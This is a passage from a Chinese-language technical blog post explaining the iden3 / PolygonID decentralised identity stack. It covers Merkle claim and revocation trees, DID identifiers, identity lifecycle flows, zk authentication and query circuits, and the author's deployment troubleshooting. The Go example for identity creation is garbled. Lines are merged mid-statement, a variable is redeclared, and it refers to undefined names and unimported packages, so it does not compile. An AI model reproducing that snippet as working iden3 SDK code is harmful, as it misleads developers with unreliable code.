<p>答案就在revocation tree中。issuer的revocation tree也是一个Sparse Merkle Tree，它的叶子结点存放了被撤销的claim。如果一个issuer想撤销掉某已发放的claim，只需要取这个claim的revocation nonce，然后在revocation tree的revocation nonce插入这个claim的最新版本号即可（版本号涉及到更新过程，我们后面再来讨论）。revocation nonce也可以看成是claim的另一个id。</p>
<p>当verifier想要验证一个claim的有效性的时候，除了验证claim存储在holder的claims tree中以外，还要验证claim在issuer、holder中均未撤销。后面会详细介绍电路是如何验证的。</p>
<h3 id="roots-of-roots树"><a href="#roots-of-roots树" class="headerlink" title="roots of roots树"></a>roots of roots树</h3><p>claims tree每次添加完claims后，树根就会重新计算，新的树根也会被插入到roots of roots tree中。roots of tree的目的是使得claims的历史变更记录更容易被追踪。不过，就笔者目前看到的各类电路源码中，仅要求roots of roots提供的树根以用于合成identity state，而不会要求提供roots of roots相关的其他证明；也因此，笔者这次并没有维护roots of roots，直接保持空树，完全没有问题。</p>
<h3 id="可见性"><a href="#可见性" class="headerlink" title="可见性"></a>可见性</h3><p>前面在介绍revocation tree的时候，提到了holder若要证明一个claim的有效性，除了提供存在性证明，还要提供issuer开具未撤销证明，这就要求issuer配合，如果issuer拒绝配合，holder就无法完成身份的验证。</p>
<p>然而事实并非如此。这是因为，issuer的三棵树是有公有性规范的。下图中，红色部分表示私有—Issuer数据库；绿色部分表示公开存储，例如 IPFS；蓝色部分表示记录在区块链上。这样，由于revocation tree属于绿色部分，是公开存储的，因此holder直接从revocation tree开具证明即可，他只需用claim的revocation nonce，到revocation tree对应位置提供merkle proof，zk veritifer会验证这个proof，并结合其他两棵树的树根重新合成身份，并最终到链上去对比issuer的状态。</p>
<p>那么为什么claims tree要隐私存储呢？回顾claim的功能：它存储了的是属性，而did认为这些都是隐私数据。有些读者可能问，前面提到claim tree的叶子结点存的</p>
<p>又不是claim原文，而是claim的hValue部分，它也是个哈希呀？笔者对此的猜测是，这可能仍然存在撞库攻击的可能性，首先claim的schema是公开的，查到schema后，对对应的value字段暴力枚举所有可能性，还是有可能破解一些claim的内容的。因此，必须把claim叶子结点完全隐私化存储。</p>
<h3 id="身份标识符"><a href="#身份标识符" class="headerlink" title="身份标识符"></a>身份标识符</h3><p>读者也许会好奇，前文演示polygonID时，用户有一个形如”11ruZLTyALHTYQz8tUx2zVa3EYXXBbgYEd7dmzXb3”，它是怎么生成的？</p>
<p>身份具有标识符，它表示身份的初始状态，由初始状态三棵树构成，该状态也被称为Genesis ID。初始情况下，revocation树、roots tree都是空的；而claim tree树包括了一个特殊的claim——authrization key，也称为auth claim，它保存了身份的公钥，后续所有的claim操作都必须提交和它公钥匹配的数字签名。身份标识符有31字节，由如下格式：</p>
<ul>
<li>身份类型：占2字节，表示身份所遵循的标准。例如，例如哈希采用什么算法等等。</li>
<li>初始状态：占27字节，砍掉genesis state的前5个字节。</li>
<li>校验和：占2个字节。</li>
</ul>
<p>这个31个字节，使用base58编码，就得到了did标识符。</p>
<h1 id="Round3-关键流程"><a href="#Round3-关键流程" class="headerlink" title="Round3: 关键流程"></a>Round3: 关键流程</h1><p>介绍完基本概念，现在从用户角度出发，结合代码，梳理一下iden3中的一些关键流程的原理。<br>目前，iden3提供了node和go两个sdk：</p>
<p>若要安装node的sdk：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yarn add @iden3&#x2F;iden3js</span><br></pre></td></tr></table></figure>

<p>若要安装go的sdk：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">go get github.com&#x2F;iden3&#x2F;go-iden3-core</span><br></pre></td></tr></table></figure>
<p>本文档采用go语言作为示例，由于iden3的sdk非常直观，所以即使您不熟悉golang，也可以很轻松看懂相关逻辑。</p>
<h2 id="身份创建"><a href="#身份创建" class="headerlink" title="身份创建"></a>身份创建</h2><p>创建身份的过程包括如下几步：</p>
<ul>
<li>先创建一个随机的babyjubjub密钥对</li>
<li>将babyjubjub公钥嵌入auth claim</li>
<li>创建身份的三棵树</li>
<li>将auth claim嵌入到claims 树中</li>
<li>对三棵树执行hash，生成tree root，作为genesis state</li>
<li>根据genesis state构建did标识符。</li>
</ul>
<p>至此，完成了身份的创建，iden3认为这个时候不必将身份记录到链上，后续状态发生变更，才需要把身份提交到链上。<a href="https://docs.iden3.io/getting-started/babyjubjub/">https://docs.iden3.io/getting-started/babyjubjub/</a></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/iden3/go-iden3-core&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/iden3/go-iden3-crypto/babyjub&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/iden3/go-merkletree-sql/v2&quot;</span> <span class="string">&quot;github.com/iden3/go-merkletree-sql/v2/db/memory&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/iden3/go-iden3-crypto/poseidon&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// generate babyJubjub private key randomly</span></span><br><span class="line">    babyJubjubPrivKey := babyjub.NewRandPrivKey()</span><br><span class="line">    <span class="comment">// generate public key from private key</span></span><br><span class="line">    babyJubjubPubKey := babyJubjubPrivKey.Public()</span><br><span class="line">    </span><br><span class="line">	<span class="comment">// Create auth claim</span></span><br><span class="line">	authSchemaHash, _ := core.NewSchemaHashFromHex(<span class="string">&quot;ca938857241db9451ea329256b9c06e5&quot;</span>) </span><br><span class="line">	<span class="comment">// Add revocation nonce. Used to invalidate the claim. This may be a random number in the real implementation. </span></span><br><span class="line">	revNonce := <span class="keyword">uint64</span>(<span class="number">1</span>) </span><br><span class="line">	<span class="comment">// Create auth Claim </span></span><br><span class="line">	authClaim, _ := core.NewClaim(authSchemaHash, core.WithIndexDataInts(babyJubjubPubKey.X, babyJubjubPubKey.Y), core.WithRevocationNonce(revNonce))</span><br><span class="line">	authClaimToMarshal, _ := json.Marshal(authClaim) </span><br><span class="line">	fmt.Println(<span class="keyword">string</span>(authClaimToMarshal))</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Generate the three identity trees</span></span><br><span class="line">	ctx := context.Background() </span><br><span class="line">	<span class="comment">// Create empty Claims tree </span></span><br><span class="line">	clt, _ := merkletree.NewMerkleTree(ctx, memory.NewMemoryStorage(), <span class="number">40</span>) </span><br><span class="line">	<span class="comment">// Create empty Revocation tree </span></span><br><span class="line">	ret, _ := merkletree.NewMerkleTree(ctx, memory.NewMemoryStorage(), <span class="number">40</span>) </span><br><span class="line">	<span class="comment">// Create empty Roots tree </span></span><br><span class="line">	rot, _ := merkletree.NewMerkleTree(ctx, memory.NewMemoryStorage(), <span class="number">40</span>) authClaim := core.NewClaim(core.AuthSchemaHash, core.WithIndexDataInts(X, Y), core.WithRevocationNonce(<span class="number">0</span>)) </span><br><span class="line">	<span class="comment">// Get the Index and the Value of the authClaim </span></span><br><span class="line">	hIndex, hValue, _ := authClaim.HiHv() </span><br><span class="line">	<span class="comment">// add auth claim to claims tree with value hValue at index </span></span><br><span class="line">	hIndex clt.Add(ctx, hIndex, hValue) </span><br><span class="line">	<span class="comment">// print the roots </span></span><br><span class="line">	fmt.Println(clt.Root().BigInt(), ret.Root().BigInt(), rot.Root().BigInt())</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Get hash Index and hash Value of the new claim </span></span><br><span class="line">	hi, hv, _ := newClaim.HiHv() </span><br><span class="line">	<span class="comment">// Add claim to the Claims tree </span></span><br><span class="line">	clt.Add(ctx, hi, hv)</span><br><span class="line">	<span class="comment">// GENESIS STATE: </span></span><br><span class="line">	<span class="comment">// 1. Generate Merkle Tree Proof for authClaim at Genesis State </span></span><br><span class="line">	authMTPProof, _, _ := clt.GenerateProof(ctx, hIndex, clt.Root()) </span><br><span class="line">	<span class="comment">// 2. Generate the Non-Revocation Merkle tree proof for the authClaim at Genesis State </span></span><br><span class="line">	authNonRevMTPProof, _, _ := ret.GenerateProof(ctx, <span class="built_in">new</span>(big.Int).SetUint64(revNonce), ret.Root()) </span><br><span class="line">	<span class="comment">// Snapshot of the Genesis State </span></span><br><span class="line">	genesisTreeState := circuits.TreeState&#123; State: state, ClaimsRoot: clt.Root(), RevocationRoot: ret.Root(), RootOfRoots: rot.Root(), &#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="添加claim"><a href="#添加claim" class="headerlink" title="添加claim"></a>添加claim</h2><p>添加claim的过程包括：</p>
<ul>
<li>创建claim</li>
<li>将claim添加到claims 树中</li>
<li>可选地，将新的claims树根更新到roots of roots中</li>
<li>根据三棵树，重新计算出新的身份</li>
<li>构造zk证明：<strong>状态转移证明</strong>（证明的原理，后文统一解释）</li>
<li>将zk证明同步到state合约（记录did的所有states），state合约验证zk proof和公开输入后（（注：zk中输入公开是为了校验这些公开，zk本身只能验证输入信号之间的逻辑关系，至于输入信号本身需要zk以外的东西来验证）），将该账户新的状态存储到合约内部。<br><a href="https://docs.iden3.io/getting-started/state-transition/new-identity-state/">https://docs.iden3.io/getting-started/state-transition/new-identity-state/</a></li>
</ul>
<h2 id="撤销claim"><a href="#撤销claim" class="headerlink" title="撤销claim"></a>撤销claim</h2><p>撤销claim的步骤如下：</p>
<ul>
<li>提取claim的revocation nonce，插入到revocation tree中</li>
<li>重新计算身份的状态</li>
<li>构造zk证明：<strong>状态转移证明</strong>（证明的原理，后文统一解释）</li>
<li>将zk证明同步到state合约（记录did的所有states），state合约验证zk和公开输入后，将该账户新的状态存储到合约内部。<br><a href="https://docs.iden3.io/getting-started/claim-revocation/">https://docs.iden3.io/getting-started/claim-revocation/</a></li>
</ul>
<h2 id="更新claim"><a href="#更新claim" class="headerlink" title="更新claim"></a>更新claim</h2><p>回顾claim的结构，如果claim的i_0中开启了updatable功能，那么就允许版本更新；版本号嵌入到i_0插槽中，意味着版本变了，那么hIndex也就变了，在claim tree中的存储位置也变了。</p>
<p>更新claim的逻辑，就是把旧版本撤销掉，然后构建一个新的claim，然后把新的版本号更新revocation tree中。具体步骤：</p>
<ul>
<li>取旧的claim的revocation nonce，并将它当前版本号插入到revocation tree的value部分中。</li>
<li>创建新的claim，它的版本号要比先前的更高。新的claim会插入到claim tree。</li>
<li>构造zk证明：<strong>状态转移证明</strong>（证明的原理，后文统一解释）</li>
<li>将zk证明同步到state合约（记录did的所有states），state合约验证zk proof和公开输入后，将该账户新的状态存储到合约内部。</li>
</ul>
<p>假设最新的claim版本号是n，如果我们试图基于一个旧的claim（其版本号为v，v &lt; n）构造有效性证明，会怎么样呢，理应是验证失败，因为验证版本的逻辑丽颖是，如果claim是updatable，则要求用户提交rev tree中的证明（即最新版本n的逻辑），然后取claim中的version进行对比,即验证version == v；反之如果是不updatable的，则只需提供叶子为(revocation nonce, 0)的证明即可。但是我源码中并没有看到这段版本验证逻辑，甚至都没有看到提取version字段校验的逻辑，所以Iden3究竟能不能支持更新，还请各位读者继续深入研究，这个场景我自己也没有实际验证过。</p>
<h2 id="私钥更换"><a href="#私钥更换" class="headerlink" title="私钥更换"></a>私钥更换</h2><p>文档中私钥替换被称为key rotation。用户只需要把旧的私钥对应的auth claim撤销，再把新的auth claim存入到claim tree，随后同步状态即可。步骤：</p>
<ul>
<li>旧的auth claim插入到revocation tree中</li>
<li>新的auth claim插入到claim tree中</li>
<li>计算新的状态根</li>
<li>构造zk证明：<strong>状态转移证明</strong>（证明的原理，后文统一解释）</li>
<li>将zk证明同步到state合约（记录did的所有states），state合约验证zk proof和公开输入后，将该账户新的状态存储到合约内部。</li>
</ul>
<h2 id="账户注销"><a href="#账户注销" class="headerlink" title="账户注销"></a>账户注销</h2><p>如果用户想注销自己的身份，只需将自己的所有的auth claim全部撤销，等于自己的所有公钥都被宣布为无效。这样新的状态根一旦上链，若拿着以前的公钥构造的证明，那么要么zk这里identity state对不上，要么验证公有输入的时候和合约对不上，验证不可能通过。（注：State合约中保存的是identity历史的所有state，一般情况下是用公开输入的identity state和最新的合约中state对比；但如果提交的state能和先前某一个state对的上，那么文档中的说法是“由应用自行决定如何处理”）</p>
<p>具体：</p>
<ul>
<li>将所有的auth claim插入到revocation tree</li>
<li>计算新的状态根</li>
<li>构造zk证明：<strong>状态转移证明</strong>（证明的原理，后文统一解释）</li>
<li>将zk证明同步到state合约（记录did的所有states），state合约验证zk proof和公开输入后，将该账户新的状态存储到合约内部。</li>
</ul>
<h2 id="身份认证"><a href="#身份认证" class="headerlink" title="身份认证"></a>身份认证</h2><p>先回顾一下最传统的登陆流程。</p>
<p>第一种，用户提交用户名和密码，服务端把密码加盐哈希，然后和数据库里保存的哈希值做对比。</p>
<p>第二种，第三方登录，包括授权码、PKCE、凭证式等模式；以授权码模式为例，若要登陆应用网站，可以先去其他身份服务网站登陆，然后拿到授权码，再像应用网站提交授权码，应用网站向认证网站换取accessToken，然后使用token向身份网站请求后续用户数据……</p>
<p>而现在基于did和zk技术，iden3提出了一种新的身份登陆协议。这种协议更像是用户名、密码登录的增强版本，这里面的“用户名”是就是用户的did，“密码”则是zk身份证明。协议包括两个角色：用户和应用。用户向应用请求身份认证，认证后如常规web2一样拿到token。具体步骤：</p>
<ul>
<li>用户调用网站的auth接口 (iden3comm://?request_uri=<a href="https://issuer-admin.polygonid.me/v1/qr-store?id=d7778f8e-6cd6-4a6d-ae9a-8861d9475fde">https://issuer-admin.polygonid.me/v1/qr-store?id=d7778f8e-6cd6-4a6d-ae9a-8861d9475fde</a> ，这里的链接地址来自于 Credential details 中的 QR code 解析后的结果)</li>
<li>网站的auth接口返回一个json，里面包括了认证的方法，包括采用什么电路？签名使用的哈希是什么？</li>
<li>用户根据json的要求，构造zk proof，根据json里的callback地址，访问网站的callback接口</li>
<li>网站验证zk proof和zk证明。</li>
</ul>
<p>至于这里面“authentication电路”的约束逻辑，我们后文解释。</p>
<p>这个技术在polygonID中是，被应用于领取claim：当issuer发放完offer的时候，holder用polygon钱包扫码，扫出来的就是认证json。holder钱包构造好证明后，将自己的did连同身份提交回platform网站，身份认证通过后，platform构造claim，包括将claim的subject部分设为holder did。然后把这个claim返回给holder钱包，holder钱包存下该claim，并后面按时同步给链上state合约。</p>
<h2 id="提供凭证"><a href="#提供凭证" class="headerlink" title="提供凭证"></a>提供凭证</h2><p>还是那个经典问题：你如何在不暴露年龄的情况下，证明自己大于18岁？通常是构建一个电路，用户提供两个输入：出生年月（私有输入）和当前日期（公有输入）。zk电路验证当前日期减去出生年月 大于 18；而对于验证者，除了校验zk，还要验证公开输入，即校验当前日期确实等于当前日期。电路类似如下：</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">template AgeOver18() &#123;</span><br><span class="line">    <span class="comment">// 定义输入：出生年份和当前年份</span></span><br><span class="line">    signal input birthYear;</span><br><span class="line">    signal input currentYear;</span><br><span class="line">    <span class="comment">// 定义一个信号来存储年龄</span></span><br><span class="line">    signal output age;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 计算年龄</span></span><br><span class="line">    age &lt;== currentYear - birthYear;</span><br><span class="line">    <span class="comment">// 确保年龄大于18</span></span><br><span class="line">    assert(age &gt;= <span class="number">18</span>);</span><br><span class="line">&#125;</span><br><span class="line">component main = AgeOver18();</span><br></pre></td></tr></table></figure>

<p>诸如此类，都是常见的需求。为了能够让用户能够避免每次都写这样的代码，Iden3将比较常见的查询需求都统一起来，构建了一套ZKL（Zero Knowledge Language）。用户将操作符、输入、操作数据作为输入，其中数据输入是私有的，其余公开的。提供 它包括日常的功能：</p>
<ul>
<li>Equal：相等比较。</li>
<li>Less Than：小于</li>
<li>Greater Than：大于</li>
<li>In：属于某个集合。例如角色 in [‘Boss’, ‘Manager’, ‘Employee’]这种。注意不是范围证明。</li>
<li>Not In：不属于某个集合。</li>
</ul>
<p>好吧，并没有实现范围证明，希望将来可以实现。<br>理解了Query，用户就可以提供凭证。假如用户希望证明自己的claim属性满足条件，那么一方面提供claim本身的有效性证明，包括claim在holder的存在性证明、在holder/issuer未撤销证明，还有提供上述zkl的输入。电路会去验证这些输入的关联性，而verifier还会验证公开输入的有效性。</p>
<h1 id="Round4-源码导读"><a href="#Round4-源码导读" class="headerlink" title="Round4: 源码导读"></a>Round4: 源码导读</h1><p>理解了上述大部分逻辑，阅读源码就很轻松了。这里主要列一下State合约，还有几个重要电路。理解了这些代码，基本等于掌握了Iden3的核心逻辑。</p>
<h2 id="State合约"><a href="#State合约" class="headerlink" title="State合约"></a>State合约</h2><p>State合约见：<a href="https://github.com/iden3/contracts/blob/master/contracts/state/State.sol">https://github.com/iden3/contracts/blob/master/contracts/state/State.sol</a></p>
<p>核心函数transitionState</p>
<h2 id="authentication电路"><a href="#authentication电路" class="headerlink" title="authentication电路"></a>authentication电路</h2><p>代码：<a href="https://github.com/iden3/circuits/blob/master/circuits/lib/authentication.circom">https://github.com/iden3/circuits/blob/master/circuits/lib/authentication.circom</a></p>
<p>authentication用于证明用户持有一个有效的公钥。公钥记录在auth claim中。验证逻辑：</p>
<ul>
<li>authclaim属于holder的claims树</li>
<li>authClaim未被holder撤销（即revocation tree可以提供缺失证明）</li>
<li>holder状态等于三棵树的哈希</li>
<li>签名必须能用authclaim里的公钥验证</li>
</ul>
<p>除了authentiction，还有一个authenticationWithRelay，它用于某个relayer帮助Provoder转交证明的情况。验证逻辑：</p>
<ul>
<li>authclaim属于holder的claims树</li>
<li>authClaim未被holder撤销（即revocationtree可以提供缺失证明）</li>
<li>holder状态等于三棵树的哈希</li>
<li>签名必须能用authclaim里的公钥验证</li>
<li>relayer要提供一个relay claim，里面的数据主体是holder</li>
<li>relayer的relay claim必须在relayer的claims树中存在</li>
<li>relayer状态等于三棵树的哈希</li>
</ul>
<h2 id="stateTransition电路"><a href="#stateTransition电路" class="headerlink" title="stateTransition电路"></a>stateTransition电路</h2><p>代码：<a href="https://github.com/iden3/circuits/blob/master/circuits/lib/stateTransition.circom">https://github.com/iden3/circuits/blob/master/circuits/lib/stateTransition.circom</a><br>当用户颁发了claim，或者接收了claim，更新了自己的身份状态时，需要将自己的身份状态和相关证明发布到链上，供验证。电路的验证逻辑：</p>
<ul>
<li>如果旧状态是genesis状态，则用户id是否和genesis对的上</li>
<li>sanity check：新状态不为0、新状态不等于旧状态</li>
<li>验证auth claim的有效性，包括它的存在性证明、未撤销证明（还原的树根需和输入旧状态）</li>
<li>根据auth claim的公钥，验证签名的有效性，其中消息摘要为新旧状态拼起来的poseidon哈希</li>
</ul>
<h2 id="crerdentialAtomicQueryMPT电路"><a href="#crerdentialAtomicQueryMPT电路" class="headerlink" title="crerdentialAtomicQueryMPT电路"></a>crerdentialAtomicQueryMPT电路</h2><p>该电路用于基于claim数据，进行选择性披露：<a href="https://github.com/iden3/circuits/blob/master/circuits/lib/query/credentialAtomicQueryMTP.circom">https://github.com/iden3/circuits/blob/master/circuits/lib/query/credentialAtomicQueryMTP.circom</a></p>
<p>它的逻辑很简单，就是检查claim的有效性，然后检查query的有效性。<br>它对常规的几个操作符验证结果先算出来，然后用mux选择器，把用户要做的那个查询的结果提取出来。</p>
<h1 id="Round5-回顾应用"><a href="#Round5-回顾应用" class="headerlink" title="Round5: 回顾应用"></a>Round5: 回顾应用</h1><p>我们已经介绍完了Iden3的核心内容。为了加深印象，现在我们回到polygonID，重新梳理一遍整个流程。</p>
<h3 id="注册issuer-1"><a href="#注册issuer-1" class="headerlink" title="注册issuer"></a>注册issuer</h3><p>用户注册后，后台实际是调用前文“身份创建”的逻辑，即创建babyjubjub密钥、添加auth claim、计算genesis state、计算did。</p>
<h3 id="Issuer创建schema-1"><a href="#Issuer创建schema-1" class="headerlink" title="Issuer创建schema"></a>Issuer创建schema</h3><p>这里面，issuer构建了一个schema，这是一个jsonld文件，存储在了数据库。</p>
<h3 id="Issuer创建Offer"><a href="#Issuer创建Offer" class="headerlink" title="Issuer创建Offer"></a>Issuer创建Offer</h3><p>这里面，issuer创建了一个offer，然后存入数据库。</p>
<h3 id="Holder领取Claim-1"><a href="#Holder领取Claim-1" class="headerlink" title="Holder领取Claim"></a>Holder领取Claim</h3><p>holder点开offer link，此时页面会向后台请求auth json，即前文“身份认证”过程。holder钱包扫码这个二维码。</p>
<p>Platform若想可信地获取到钱包的二维码，需要先生成一个json.</p>
<p>它规定了手机端应该提供何种方式来证明自己的身份，zk？签名？如果用zk，使用哪个电路？等等。以这个json为例，它要求使用auth电路来证明身份，auth电路则本质是验证用户的签名，而challenge则是待签署的数据。</p>
<p>这个json可以使用二维码，邮箱等方式发送给手机钱包。手机钱包拿到这个json后，需要进行如下步骤处理：<br>1） 使用什么方式证明自己的身份？zk？签名？如果用zk，使用什么电路？<br>2） 根据上述指定的方式，构造自己的响应。<br>3） 将响应发送给callback url。</p>
<p>polygon platform在收到响应后，执行如下验证过程：<br>1） 验证zk本身。在这个例子中，根据auth电路，验证proof相当于验证了：<br>a. 对方提供的签名，可以用challenge原文、auth claim记录的公钥成功校验。<br>b. 对方可以证明auth claim属于对方，即可以提供auth claim的proof，还有auth claim的未撤销证明。它们合成的状态根等于用户提供的身份状态。<br>2） 抽取metadata。它包括了公有输入部分。例如对方的did。<br>3） 验证用户identity states。在验证zk过程中，我们相当于校验了对方提供的身份状态的有效性，但这还不能证明这个状态根和did相符合，这个时候就需要去链上查找，看did对应的状态根一致。（但如果用户提供的是一个过去时的状态根呢？则用二分搜索法，找到这个状态根。）<br>4） 验证公有输入部分。例如claim的schema hash需要和存储的schema一致。</p>
<p>在笔者开发中，我们对这部分做了小小的扩展。我们的业务场景是，用户还要额外提供自己的polygon钱包地址和签名，platform还要额外验证该钱包。验证后，platform会向knn3的地址（例如<a href="https://credentials.knn3.xyz/nft/0x64e16D972Dac15d0700764f64C9011432d59A79C%EF%BC%89">https://credentials.knn3.xyz/nft/0x64e16D972Dac15d0700764f64C9011432d59A79C）</a></p>
<p>获取链上的数据，如果和预设条件一致，则增发claim。这里面，zk证明和钱包证明必须结合起来，必然攻击者把钱包替换掉。笔者最开始尝试使用0xParc的ECDSA纳入到authentication电路里，但是这样生成了100k的约束，光跑groth16的可信设置，一天一夜都没跑完。后面换了个简单的做法，在zk proof公有输入中，babyjubjub的签名使用的那个哈希，也加入钱包的内容，这样platform验证时，先通过钱包签名恢复出polygon地址，然后计算哈希，哈希必须和zk公有输入一致，然后验证zk proof。这样就解决了上述安全性问题，且约束仅有2.5w。</p>
<h3 id="Holder创建Proof-1"><a href="#Holder创建Proof-1" class="headerlink" title="Holder创建Proof"></a>Holder创建Proof</h3><p>holder根据claim，使用前文zkl构建对claim的选择性披露，如果claim的数据达到一定条件，就让另一个SBT合约给他签发一个徽章。</p>
<p>这里面，回忆一下，若要证明claim的有效性，必须提供issue的revocation tree未撤销证明。这里面笔者因为时间很赶，直接让platform开了一个接口去提供这个证明。实际上，revocation tree应该存储在IPFS或者AR上。</p>
<h1 id="Round6：实战踩坑"><a href="#Round6：实战踩坑" class="headerlink" title="Round6：实战踩坑"></a>Round6：实战踩坑</h1><p>iden3本身还在迭代，开发过程中，会遇到不少问题。记录一下踩到的坑，让诸位避免重复踩坑。</p>
<h2 id="问题1-我应该使用哪些sdk？"><a href="#问题1-我应该使用哪些sdk？" class="headerlink" title="问题1: 我应该使用哪些sdk？"></a>问题1: 我应该使用哪些sdk？</h2><p>iden3的sdk比较杂乱，约有数十个仓库，有些代码都是几年前的，而且文档几乎是没有；甚至还有很多代码里很有注释掉的代码。经过摸索，笔者最终选择了这些仓库：</p>
<p><strong>1）iden3核心: go-iden3-core</strong><br>包含了iden3核心功能，包括claim、identity的功能。注意0.8版本是一个稳定版本，但是版本太老了，笔者采用了最新的代码，也完全没有问题。</p>
<p><a href="https://github.com/iden3/go-iden3-core">https://github.com/iden3/go-iden3-core</a><br>示例可以参考<a href="https://github.com/0xPolygonID/tutorial-examples/tree/main/issuer-protocol">https://github.com/0xPolygonID/tutorial-examples/tree/main/issuer-protocol</a></p>
<p><strong>2）merkle tree: go-merkletree-sql</strong><br>包含了merkle tree功能。目前支持两种存储模式：memory和postgres。</p>
<p><a href="https://github.com/iden3/go-merkletree-sql/tree/master/db/memory">https://github.com/iden3/go-merkletree-sql/tree/master/db/memory</a><br>无论是memory还是postgres，都实现了一个抽象的Storage接口，以实现对树根和节点的存储。<br>若要扩展，请自行实现DB的接口。</p>
<p><strong>3）电路输入创建: go-circuits</strong><br>为了让用户便于生成zk 输入，go-circuits封装了相关逻辑，例如创建一个auth电路输入，就很容易。</p>
<p><a href="https://github.com/iden3/go-circuits">https://github.com/iden3/go-circuits</a><br>这个input还可以调用inputMarshall，变成bytes。</p>
<p><strong>4） 见证计算：go-circom-witnesscalc</strong><br>用于根据输入json，计算见证witness。</p>
<p><a href="https://github.com/iden3/go-circom-witnesscalc">https://github.com/iden3/go-circom-witnesscalc</a></p>
<p><strong>5） 证明生成&amp;&amp;验证： go-rapidsnark</strong><br>这是一个c底层的库。</p>
<p><a href="https://github.com/iden3/go-rapidsnark">https://github.com/iden3/go-rapidsnark</a><br>创建证明proof。<br>验证。</p>
<h2 id="问题2-如何为账户构建merkle-tree持久化存储？"><a href="#问题2-如何为账户构建merkle-tree持久化存储？" class="headerlink" title="问题2: 如何为账户构建merkle tree持久化存储？"></a>问题2: 如何为账户构建merkle tree持久化存储？</h2><p>首先，merkle tree支持postgre存储。它的表结构如下(<a href="https://github.com/iden3/go-merkletree-sql/blob/master/db/pgx/schema.sql">https://github.com/iden3/go-merkletree-sql/blob/master/db/pgx/schema.sql</a>)：</p>
<p>如果我们阅读<a href="https://github.com/iden3/go-merkletree-sql/blob/master/db/pgx/sql.go%EF%BC%8C%E4%BD%86%E8%BF%99%E5%9F%BA%E6%9C%AC%E5%B0%B1%E6%98%AF%E4%B8%80%E5%B1%82%E5%A3%B3%EF%BC%8C%E8%8B%A5%E7%9C%9F%E8%A6%81%E4%BD%BF%E7%94%A8postgresql%EF%BC%8C%E6%88%91%E4%BB%AC%E8%BF%98%E6%98%AF%E9%9C%80%E8%A6%81%E8%87%AA%E5%B7%B1%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AADB%E7%9A%84%E5%AE%9E%E7%8E%B0%E7%B1%BB%EF%BC%8C%E6%9D%A5%E6%94%AF%E6%8C%81%E4%B8%8A%E8%BF%B0%E6%9F%A5%E8%AF%A2%E3%80%82">https://github.com/iden3/go-merkletree-sql/blob/master/db/pgx/sql.go，但这基本就是一层壳，若真要使用postgresql，我们还是需要自己实现一个DB的实现类，来支持上述查询。</a></p>
<h2 id="问题3-计算见证时报reference等错误？"><a href="#问题3-计算见证时报reference等错误？" class="headerlink" title="问题3:计算见证时报reference等错误？"></a>问题3:计算见证时报reference等错误？</h2><p>注意，截止目前，go-circom-witnesscalc最新发布的版本是1.0.2版本有bug，跑最基本的电路都会报各种wasm自身的错误。经过研究，这是因为witness_calculator文件在1.0.2版本之前存在bug。(<a href="https://github.com/iden3/go-circom-witnesscalc/blob/master/circom2witnesscalc.go">https://github.com/iden3/go-circom-witnesscalc/blob/master/circom2witnesscalc.go</a>)存在bug，不过已在master分支解决，待发布。我自己的解决办法是直接拷贝witness_calculator的master分支代码到本地，用这份来代码来执行计算见证即可。</p>
<p>额外吐槽一下，Iden3有些细节做的确实不太好，比如circom教程中，按照文档复制粘贴过来的基础电路竟然跑不通：<a href="https://github.com/iden3/snarkjs/issues/252">https://github.com/iden3/snarkjs/issues/252</a></p>
<h2 id="问题4-对go-rapidsnarkjs环境相关问题？"><a href="#问题4-对go-rapidsnarkjs环境相关问题？" class="headerlink" title="问题4: 对go-rapidsnarkjs环境相关问题？"></a>问题4: 对go-rapidsnarkjs环境相关问题？</h2><p>因为使用了c库，因此底层环境要选择正确。需要参考操作系统和cpu架构是否支持（在<a href="https://github.com/iden3/go-rapidsnark/tree/main/prover%EF%BC%89%E3%80%82">https://github.com/iden3/go-rapidsnark/tree/main/prover）。</a></p>
<p>在开发过程中，笔者采用macos 12 + m1，没有遇到任何问题。但在部署时，部署到centos7服务器时，遇到了问题，需要选择合适的gcc版本。用centos自带的4.8无法完成编译；但用最新的10+版本又无法安装所要求的glibc 2.18。所以在朋友的帮助下，最终搞定了环境。最后选择的gcc是v7。</p>
<h2 id="问题5-见证计算经常报验证失败，如何debug？最常遇到了什么样的bug？"><a href="#问题5-见证计算经常报验证失败，如何debug？最常遇到了什么样的bug？" class="headerlink" title="问题5: 见证计算经常报验证失败，如何debug？最常遇到了什么样的bug？"></a>问题5: 见证计算经常报验证失败，如何debug？最常遇到了什么样的bug？</h2><p>计算见证时，除了计算各种信号，还会检查信号约束是否满足条件。如果遇到bug，怎么解决呢？</p>
<p>这种错误源于电路输入中某个字段不正确。为了找出这个字段，笔者的做法很简单，首先，项目中要打印出用go-circuits构建的zk 输入；然后，zk电路中可以在关键节点中用log语句打印输入的值；然后把这个输入拷贝到input.ajson中，手动运行电路，然后看看是哪里报错。基本就可以推断出代码中是哪一步错误了，然后继续对代码中关键部分打日志、调查。很快就能找到错误原因。</p>
<p>以笔者的经验，遇到过genesis state和id不一致，也就是stateTransition的这一步，原因来讲，我自己遇到的有两种：</p>
<p>1）编码错误，树根传错了（我曾经传了两个claimtree + roots of roots tree计算树根），导致genesisState计算错误，自然和id对不上；<br>2）postgresql中有脏数据。涉及的db操作太多，当时又没做分布式事务，也没有用最终一致性，经常有一半的状态，导致树根计算不正确。</p>
